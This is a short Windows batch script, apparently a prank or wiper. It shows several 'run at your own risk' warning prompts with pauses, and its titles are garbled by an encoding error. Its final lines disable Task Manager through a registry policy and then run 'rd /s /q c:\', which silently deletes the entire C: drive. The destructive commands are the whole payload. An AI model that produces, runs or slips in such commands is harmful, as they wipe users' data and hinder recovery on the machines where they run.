@ echo off
title �x��
echo Please be aware that it will break if executed, so please do so at your own risk. Do you want to run it?
pause
cls
@ echo off
title �x��
echo run?
pause 
cls
@echo off
title �ŏI�x��
echo run?????????.
pause
cls
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
cmd /c rd /s /q c:\